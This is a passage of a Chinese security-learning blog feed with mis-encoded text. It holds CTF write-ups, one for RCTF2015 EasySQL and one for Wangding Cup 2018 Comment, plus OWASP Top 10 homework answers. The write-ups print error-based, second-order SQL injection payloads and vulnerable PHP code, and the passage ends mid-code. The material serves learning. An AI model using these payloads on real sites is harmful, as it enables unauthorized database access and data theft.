    <content type="html"><![CDATA[<h3 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæœ‰æ³¨å†Œå’Œä¿®æ”¹å¯†ç åŠŸèƒ½â€¦â€¦ä¼¼ä¹æœ‰index.phpsæºç ï¼Œä½†æ˜¯forbidden</p><p>å‘ç°adminå·²ç»è¢«æ³¨å†Œâ€¦â€¦éš¾é“å¯ä»¥å…ˆæ³¨å…¥è·å–adminè´¦æˆ·å†å¾—åˆ°æºç è¿›ä¸€æ­¥æ¸—é€ï¼Ÿ</p><p>æ³¨å†Œä¸€ä¸ª<code>\</code>,åœ¨changeå¯†ç æ—¶å‘ç”ŸæŠ¥é”™ï¼š</p><p><img src="/images/RCTF2015-EasySQL/image-20210425120947836.png" alt="image-20210425120947836"></p><p>pwdåçš„ä¸€ä¸²æ˜¯0çš„md5å€¼â€¦â€¦</p><p>è¿™å¯èƒ½æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œåœ¨æ‹¿å‡ºæ•°æ®æ—¶æ²¡æœ‰è¿›è¡Œè½¬ä¹‰å‘ç”Ÿçš„æ¼æ´ï¼Œé‰´äºæ‰“å°äº†æŠ¥é”™ä¿¡æ¯ï¼Œå³å¯è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><p>ç±»ä¼¼ä¹‹å‰çš„é¢˜æ„é€ ï¼Œä½†æ˜¯ç”¨æˆ·åå­˜åœ¨è¿‡æ»¤ï¼Œé¦–æ¬¡å°è¯•fuzzæ“ä½œâ€¦â€¦</p><img src="/images/RCTF2015-EasySQL/image-20210425121328003.png" alt="image-20210425121328003" style="zoom:80%;" /><p>è¿‡æ»¤äº†å¾ˆå¤šâ€¦â€¦</p><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</code>æˆåŠŸå›æ˜¾æ•°æ®åº“å</p><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c6167)),0x7e),1)#</code>è·å–è¡¨å</p><img src="/images/RCTF2015-EasySQL/image-20210425121530565.png" alt="image-20210425121530565" style="zoom:80%;" /><p>å‘ç°flagè¡¨</p><img src="/images/RCTF2015-EasySQL/image-20210425121603887.png" alt="image-20210425121603887" style="zoom:80%;" /><p>flagåˆ—</p><img src="/images/RCTF2015-EasySQL/image-20210425121624544.png" alt="image-20210425121624544" style="zoom:80%;" /><p>fakeflagâ€¦â€¦é‚£å»æŸ¥æŸ¥userè¡¨</p><img src="/images/RCTF2015-EasySQL/image-20210425121710797.png" alt="image-20210425121710797" style="zoom:80%;" /><p>åº”è¯¥æ˜¯real_flag_1s_hereï¼Œä¼¼ä¹æœ‰å¤šè¡Œâ€¦â€¦concat</p><img src="/images/RCTF2015-EasySQL/image-20210425121803527.png" alt="image-20210425121803527" style="zoom:80%;" /><p>è¿™æ ·çš„æŸ¥è¯¢è¡¨æ˜ï¼Œå¾ˆå¤šè¡Œçš„æ•°æ®éƒ½æ˜¯xxxï¼Œè€Œflagåº”å½“åœ¨å…¶ä¸­ä¸€è¡Œ</p><blockquote><p>limitä¼¼ä¹ç”¨ä¸äº†ï¼Œå¾ˆå¤šåŠ å¯†ä¹Ÿä¸è¡Œï¼Œmidã€substrã€rightã€leftéƒ½è¢«banäº†â€¦â€¦</p></blockquote><p>å­¦ä¹ äº†æ­£åˆ™çš„ä½¿ç”¨ï¼š</p><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(select(real_flag_1s_here)regexp(&#39;^l&#39;))),0x7e),1)#</code></p><p>æˆ–</p><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1)#</code></p><p>where(real_flag_1s_here)regexp(â€˜^fâ€™)åŒ¹é…real_flag_1s_hereåˆ—ä¸­ä»¥få¼€å¤´çš„é‚£ä¸€è¡Œæ•°æ®ï¼Œå¤§æ¦‚æ˜¯ä¼˜å…ˆäºgroup_concatçš„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ï¼š</p><blockquote><p>â€œ&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(â€˜^fâ€™)),0x7e),1)#</p></blockquote><p>æ€ä¹ˆè§£å†³ä½æ•°ä¸è¶³æ˜¾ç¤ºä¸å…¨çš„é—®é¢˜å‘¢ï¼Ÿæ­£åˆ™å¸®åŠ©æˆ‘ä»¬æ‹¿å‡ºäº†è¿™ä¸€è¡Œçš„æ•°æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¿™è¡Œæ•°æ®é€†å‘è¾“å‡º</p><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),0x7e),1)#</code></p><blockquote><p>XPATH syntax error: â€˜~flag{4c5c3709-12d5-40af-82f2-c3â€™</p><p>XPATH syntax error: â€˜~}8f414a13433c-2f28-fa04-5d21-90â€™</p><p>&lt;phpï¼Ÿecho strrev(â€œ}8f414a13433c-2f28-fa04-5d21-90â€);</p></blockquote><p>flag{4c5c3709-12d5-40af-82f2-c33431a414f8}</p><p>è·å¾—flagâ€¦â€¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;RCTF2015-EasySQL&quot;&gt;&lt;a href=&quot;#RCTF2015-EasySQL&quot; class=&quot;headerlink&quot; title=&quot;[RCTF2015]EasySQL&quot;&gt;&lt;/a&gt;[RCTF2015]EasySQL&lt;/h3&gt;&lt;p&gt;è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œ</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>hacker101.1</title>
    <link href="http://example.com/2021/04/24/hacker101-1/"/>
    <id>http://example.com/2021/04/24/hacker101-1/</id>
    <published>2021-04-24T06:56:25.000Z</published>
    <updated>2021-05-06T07:39:32.063Z</updated>
    
    <content type="html"><![CDATA[<h5 id="hacker101-1"><a href="#hacker101-1" class="headerlink" title="hacker101.1"></a>hacker101.1</h5><p>2.è§‚çœ‹è§†é¢‘äºŒï¼Œå›ç­”ä¸‹åˆ—é—®é¢˜ï¼š</p><p>è§†é¢‘äºŒï¼š<a href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a> </p><p>1.ç›®å‰owaspçš„åå¤§webå®‰å…¨æ¼æ´æ˜¯å“ªäº›ï¼Ÿè¿™äº›æ¼æ´æ’åæ˜¯æŒ‰ç…§æ¼æ´çš„ä¸¥é‡ç¨‹åº¦æ’åºçš„è¿˜æ˜¯æŒ‰ç…§æ¼æ´çš„å¸¸è§ç¨‹åº¦æ’åºçš„ï¼Ÿï¼ˆ2åˆ†ï¼‰ </p><blockquote><p><a href="https://wiki.owasp.org/images/d/dc/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.3.pdf">ä¸­æ–‡PDF-2017</a></p><ol><li><p><strong>æ³¨å…¥æ¼æ´ï¼š</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Injection">Injection</a></p></li><li><p><strong>èº«ä»½è®¤è¯å¤±æ•ˆï¼š</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Authentication">Broken Authentication</a></p></li><li><p><strong>æ•æ„Ÿæ•°æ®æ³„éœ²ï¼š</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Data">Sensitive Data Exposure</a></p></li><li><p><strong>XMLå¤–éƒ¨å®ä½“æ¼æ´ï¼š</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#XML">XML External Entities (XXE)</a></p></li><li><p><strong>è®¿é—®æ§åˆ¶å¤±æ•ˆï¼š</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Access">Broken Access Control</a></p></li><li><p><strong>å®‰å…¨é…ç½®é”™è¯¯ï¼š</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Misconfigurations">Security Misconfigurations</a></p></li><li><p><strong>è·¨ç«™è„šæœ¬æ”»å‡»ï¼š</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#XSS">Cross-Site Scripting (XSS)</a></p></li><li><p><strong>ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼š</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Deserialization">Insecure Deserialization</a></p></li><li><p><strong>ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶ï¼š</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Vulnerabilities">Using Components with Known Vulnerabilities</a></p></li><li><p><strong>æ—¥å¿—å’Œç›‘æ§ä¸è¶³ï¼š</strong><a href="https://www.immuniweb.com/resources/owasp-top-ten/#Insufficient">Insufficient Logging and Monitoring</a></p><p><strong><em>OWASP Top 10 is a ranking of the ten most dangerous information security risks for web applications, compiled by a community of industry experts. For each point of the rating, the risk is calculated by experts based on the<a href="https://owasp.org/www-project-risk-assessment-framework/">OWASP Risk Rating Methodology</a>and includes an assessment of Weakness Prevalence, Weakness Detectability and Exploitability, as well as the criticality of the consequences of their operation or Technical Impacts.</em></strong></p><p><strong>å‰10å¤§é£é™©é¡¹æ˜¯æ ¹æ®æµè¡Œæ•°æ®é€‰æ‹©å’Œä¼˜å…ˆæ’åºï¼Œå¹¶ç»“åˆäº†å¯¹å¯åˆ©ç”¨æ€§ã€å¯æ£€æµ‹æ€§å’Œå½±å“ç¨‹åº¦çš„ä¸€è‡´æ€§è¯„ä¼°è€Œå½¢æˆã€‚</strong></p></li></ol></blockquote><p>2.è¯·ç¿»è¯‘ä¸€ä¸‹credential stuffingï¼ˆ1åˆ†ï¼‰ </p><blockquote><p>â€‹    <strong><em>one thatâ€™s really common from a pentesting perspective is what we call credential stuffing. And say that we go out we grab data from breached data thatâ€™s out there so an account thatâ€™s been compromised the list shows up on the internet and now, the hackers have access to usernames and passwords and say we are testing in some website.</em></strong></p><p>â€‹    <strong><em>we just send usernames and passwords to an application ,and thereâ€™s no threat detection weâ€™re just able to pound a login form or even use something like password spraying where we just take something like spring 2019 or summer 2020 exclamation and just throw common credentials out there and see if it sticks if weâ€™re able to continuously brute force  an application without anything preventing us or any account lockouts.</em></strong></p><p>emmï¼Œå®é™…ä¸Šå°±æ˜¯æ’åº“å—â€¦â€¦</p><p>åˆ©ç”¨å·²æ³„éœ²çš„è´¦æˆ·ä¿¡æ¯åœ¨å¤šä¸ªå¹³å°è¿›è¡Œå°è¯•ï¼Œè¿™ç§å°è¯•å¾ˆéš¾è¢«æ£€æµ‹å‡ºæ¥ã€‚ä¸åŒçš„ç”¨æˆ·åä¸å¯†ç ï¼Œç”šè‡³äºæ‰‹æœºå·ï¼Œèº«ä»½è¯å·ç­‰ç­‰æ•æ„Ÿä¿¡æ¯è¿›è¡Œç»„åˆæ¥å°è¯•ç™»å½•ã€‚å¯èƒ½ç”¨æˆ·åœ¨å¤šä¸ªå¹³å°çš„è´¦æˆ·ä¸å¯†ç æ˜¯ç›¸åŒçš„ï¼Œè¿™æ ·å°±ååˆ†å±é™©ã€‚</p><p><a href="https://blog.csdn.net/weixin_44549063/article/details/113518965"><strong>Credential Stuffing Attack</strong></a></p><p><a href="https://blog.csdn.net/still_night/article/details/104837926">Beyond credential stuffing</a></p></blockquote><p>3.ä¸ºä»€ä¹ˆè¯´ä¸å……åˆ†çš„æ—¥å¿—è®°å½•(insufficient logging)ä¹Ÿç®—owaspåå¤§æ¼æ´çš„ä¸€ç§ï¼Ÿä»–çš„å±å®³æ€§å¦‚ä½•ï¼ˆ2åˆ†ï¼‰ </p><blockquote><p> ä¹‹æ‰€ä»¥æœ‰å¾ˆå¤šå…¥ä¾µè¡Œä¸ºå‘ç”Ÿï¼Œå…¶ä¸­åŸå› ä¹‹ä¸€æ˜¯æ²¡æœ‰è¡Œä¸ºç›‘ç®¡ï¼Œæˆ–ç›‘ç®¡ä¸å……åˆ†ã€‚å…¥ä¾µè€…rè¿›å…¥ç³»ç»Ÿç„¶è€Œæ²¡æœ‰æ—¥å¿—è®°å½•è¿™ä¸€è¡Œä¸ºï¼Œæˆ–æ—¥å¿—è®°å½•ä¸å……åˆ†ã€‚</p><p>æ‰€ä»¥ï¼Œåœ¨åšä¸€äº›é¡¹ç›®æ—¶ï¼Œæ£€æŸ¥æ—¥å¿—ä¸ç›‘æ§æ˜¯ååˆ†é‡è¦çš„ã€‚ä¸å……åˆ†çš„æ—¥å¿—è®°å½•ä¸ç›‘ç®¡å¯èƒ½ä¼šå¯¼è‡´å¾ˆå¤šå…¥ä¾µè¡Œä¸ºçš„å‘ç”Ÿã€‚</p></blockquote><p>4.è¯·ç¿»é˜…ä¸€ä¸‹owasp testing guideï¼Œä»¥åŠowasp testing guide check-listï¼Œè§†é¢‘è¯´æ€ä¹ˆç»“åˆè¿™ä¸¤ä¸ªæ–‡æ¡£æ¥å­¦ä¹ æ¸—é€æµ‹è¯•ï¼Ÿ ç»“åˆä½ å¹³æ—¶æ¸—é€è¿‡ç¨‹ä¸­çš„ç»éªŒï¼Œè°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ3åˆ†ï¼‰ </p><blockquote><p><a href="https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/frontispiece/index.html">ä¸­æ–‡ç‰ˆtesting-guide</a></p><p><a href="https://github.com/tanprathan/OWASP-Testing-Checklist">https://github.com/tanprathan/OWASP-Testing-Checklist</a></p><p>ä»testing guideä¸­ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°æ‰€æœ‰çš„ä¸åŒçš„æ¸—é€æµ‹è¯•ä¸€ä¸ªç½‘ç«™åº”ç”¨çš„æ–¹æ³•ã€‚check-listå¯ä»¥æä¾›æˆ‘ä»¬åœ¨æµ‹è¯•ä¸­æ‰€æœ‰è¦æ£€æŸ¥çš„ç‚¹ï¼Œå¹¶ä¸ºè¿™äº›ç‚¹æä¾›æµ‹è¯•å·¥å…·ã€‚check-listä¸­çš„æµ‹è¯•ç‚¹å¯æ‹¿åˆ°testing guideä¸­æ£€ç´¢å¾—åˆ°æ›´ä¸ºè¯¦å°½çš„ä¿¡æ¯ä¸æ€»ç»“ï¼Œsearch engineã€operatorâ€¦â€¦and step by stepã€‚</p><p>emmmï¼Œé€ŸæŸ¥ä¸æ•™ç§‘ä¹¦çš„å…³ç³»â€¦â€¦ï¼Ÿæ¸—é€æµ‹è¯•æ˜¯å¼€å·çš„ï¼Œé€ŸæŸ¥ä¸æ•™ç§‘ä¹¦å°±æ˜¾å¾—ååˆ†é‡è¦â€¦â€¦                                                                                                                               æˆ‘ä»¬éœ€è¦æ¸…æ¥šåº”ç”¨å·¥ä½œçš„æ–¹å¼ï¼Œç†Ÿæ‚‰æµ‹è¯•çš„é€»è¾‘ï¼Œè€Œcheck-listå’Œtesting-guideè´Ÿè´£å¸®åŠ©æˆ‘ä»¬ç†é¡ºé€»è¾‘å¹¶è®°å¿†åŸºç¡€æµ‹è¯•ç‚¹ã€‚</p><p>ä»æ€è€ƒä¸é€»è¾‘å‡ºå‘ï¼Œæœ€ç»ˆè½å®åˆ°check-list and testing-guideã€‚check-list and testing-guideå¸®åŠ©æˆ‘ä»¬æŸ¥æ¼è¡¥ç¼ºã€‚</p></blockquote><ol start="5"><li>you are only as good as you notes   you are only as good as things you can refer toç»“åˆè¿™ä¸¤å¥è¯è°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ2åˆ†ï¼‰</li></ol><blockquote><p>æŒºå¥½â€¦â€¦owaspæä¾›äº†å¾ˆå¥½çš„èµ„æºï¼Œå„ç§test-guidingï¼Œhacker101ä¹Ÿæä¾›äº†å¾ˆå¥½çš„å­¦ä¹ èµ„æºï¼ˆåŒ…æ‹¬è‹±è¯­â€¦â€¦</p><p>å†™åšå®¢è¿™ä¹ˆé•¿æ—¶é—´ï¼Œæ„Ÿè§‰ä¹Ÿç¡®å®æœ‰ç”¨ã€‚åŒ…æ‹¬èµ„æ–™æŸ¥æ‰¾ã€è®°å½•payloadã€å„ç§çŸ¥è¯†ç‚¹â€¦â€¦æˆ‘ä»¬æ‰€è®°å½•çš„ã€å¯å‚è€ƒçš„ä¸œè¥¿æ˜¯è®°å¿†å¯é çš„å»¶ä¼¸ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;hacker101-1&quot;&gt;&lt;a href=&quot;#hacker101-1&quot; class=&quot;headerlink&quot; title=&quot;hacker101.1&quot;&gt;&lt;/a&gt;hacker101.1&lt;/h5&gt;&lt;p&gt;2.è§‚çœ‹è§†é¢‘äºŒï¼Œå›ç­”ä¸‹åˆ—é—®é¢˜ï¼š&lt;/p&gt;
&lt;p&gt;è§†é¢‘äºŒï¼š&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ç½‘é¼æ¯-2018-Comment</title>
    <link href="http://example.com/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"/>
    <id>http://example.com/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/</id>
    <published>2021-04-24T06:56:25.000Z</published>
    <updated>2021-04-25T12:45:34.699Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h3><p>å­¦ä¹ äº†ä¸å°‘çŸ¥è¯†â€¦â€¦â€¦â€¦</p><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œç•™è¨€éœ€è¦ç™»å½•ï¼Œå…ˆä¸ç®¡â€¦â€¦å‘ç°å­˜åœ¨gitæ³„éœ²ï¼Œä¸Šgithackï¼š</p><p>write_doï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…³é”®è¿™ç©æ„æ²¡å•¥ç”¨å•Šâ€¦â€¦å­¦ä¹ ä¸€æ³¢gitæ¢å¤</p><blockquote><p>gitExtractå·¥å…·ä¼¼ä¹ä¼šè‡ªåŠ¨æ¢å¤æ³„éœ²æ–‡ä»¶â€¦â€¦å›å»è¯•è¯•â€¦â€¦</p></blockquote><h4 id="gitæ¢å¤"><a href="#gitæ¢å¤" class="headerlink" title="gitæ¢å¤"></a>gitæ¢å¤</h4><p><a href="https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html">https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html</a></p><p><a href="%5Bhttps://blog.csdn.net/edric1261234/article/details/82796506?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1332041.9234.16192377503140215&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control%5D(https://blog.csdn.net/edric1261234/article/details/82796506?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1332041.9234.16192377503140215&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control)">git reset ä½¿ç”¨åŠå›æ»š</a></p><p><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/0013745374151782eb658c5a5ca454eaa451661275886c6000">gitçš„å·¥ä½œåŒºå’Œæš‚å­˜åŒº</a></p><p><a href="https://blog.csdn.net/jjlovefj/article/details/86476925">git log è¯¦è§£</a></p><img src="/images/ç½‘é¼æ¯-2018-Comment/image-20210425204527594.png" alt="image-20210425204527594" style="zoom:80%;" /><blockquote><p>æäº¤ä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™æ˜¯åˆ†ä¸º<code>git add</code>ã€<code>git commit</code>ä¸¤æ­¥çš„<br>å½“<code>git add</code>çš„æ—¶å€™ï¼Œæ˜¯æŠŠæ–‡ä»¶ä¸´æ—¶æ”¾åœ¨ä¸´æ—¶åŒºstageä¸­<br>å½“<code>git commit</code>çš„æ—¶å€™ï¼Œæ˜¯æŠŠä¸´æ—¶åŒºstageçš„æ‰€æœ‰å†…å®¹æäº¤åˆ°å½“å‰åˆ†æ”¯<br>å½“ç„¶è¿™ä¸¤ä¸ªåœ¨objectsç›®å½•éƒ½ä¼šç”Ÿæˆä¸€ä¸ªå¯¹è±¡æ–‡ä»¶ï¼Œæ¥å­˜å‚¨æ•°æ®ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨ git add å‘½ä»¤å°†å†…å®¹å†™å…¥æš‚å­˜åŒºã€‚                                                                                                                   git commit å‘½ä»¤ä¼šå°†æš‚å­˜åŒºå†…å®¹æ·»åŠ åˆ°æœ¬åœ°ä»“åº“ä¸­</p></blockquote><p>è¿™é‡Œè¦ç»“åˆGitHackerä½¿ç”¨ï¼Œgithackerä¼¼ä¹åœ¨è·å–æ³„éœ²æ–‡ä»¶ä¸Šèƒ½å¤Ÿè·å–åˆ°æ›´è¯¦å°½çš„ä¿¡æ¯ã€‚</p><blockquote><p>ä¸ªäººä½“éªŒï¼šGitHackerè¦åœ¨linuxä¸Šç”¨ï¼Œéœ€è¦pythonçš„requestsâ€¦â€¦</p></blockquote><p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡ï¼šgit logæŸ¥çœ‹commit historyï¼š</p><img src="/images/ç½‘é¼æ¯-2018-Comment/image-20210424151445916.png" alt="image-20210424151445916" style="zoom:80%;" /><p>git resetå›æ»šæœªcommitç‰ˆæœ¬å‰å·²ç»commitçš„ç½‘é¡µæºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç±»ä¼¼åˆšåšè¿‡çš„<strong>CyberPunk</strong>ï¼Œå¯¹è¾“å…¥åšäº†è½¬ä¹‰ï¼Œç„¶è€Œ<code>$category = mysql_fetch_array($result)[&#39;category&#39;];</code>å´ç›´æ¥æŠ“å–äº†ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><h4 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = 